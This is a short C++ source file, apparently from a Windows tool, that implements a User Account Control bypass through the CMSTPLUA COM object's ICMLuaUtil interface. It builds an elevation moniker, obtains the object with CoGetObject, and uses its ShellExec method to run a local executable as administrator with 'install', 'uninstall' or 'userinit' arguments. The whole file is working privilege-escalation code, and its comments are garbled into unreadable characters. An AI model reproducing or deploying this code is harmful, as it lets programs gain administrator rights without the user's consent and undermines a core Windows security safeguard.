#include "BypassUAC.h"


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// ��ʼ��COM����
	::CoInitialize(NULL);

	// �����ַ���
	::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}

	// ����BIND_OPTS3
	::RtlZeroMemory(&bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;

	// �������ƶ��󲢻�ȡCOM����
	hr = ::CoGetObject(wszMonikerName, &bo, riid, ppVoid);
	return hr;
}


BOOL CMLuaUtilBypassUAC(int type)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;

	::CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
	::IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

	// ��Ȩ
	hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
	if (FAILED(hr))
	{
		return FALSE;
	}

	TCHAR lpwszExecutable[260]{};
	TCHAR lpwszCurrentDir[260]{};
	GetCurrentDirectory(260, lpwszCurrentDir);
	PathCombine(lpwszExecutable, lpwszCurrentDir, PRIVATE_ADMIN_TASK_EXE_NAME);

	switch (type)
	{
		case PRIVATE_TYPE_INSTALL:
		{
			// ��������
			hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, L"install", NULL, 0, SW_SHOW);
		}
			break;
		case PRIVATE_TYPE_UNINSTALL:
		{
			// ��������
			hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, L"uninstall", NULL, 0, SW_SHOW);
		}
			break;
		case PRIVATE_TYPE_USERINIT:
		{
			// ��������
			hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, L"userinit", NULL, 0, SW_SHOW);
		}
			break;
		default:
			break;
	}
	
	if (FAILED(hr))
	{
		return FALSE;
	}

	bRet = TRUE;


	// �ͷ�
	if (CMLuaUtil)
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	return bRet;
}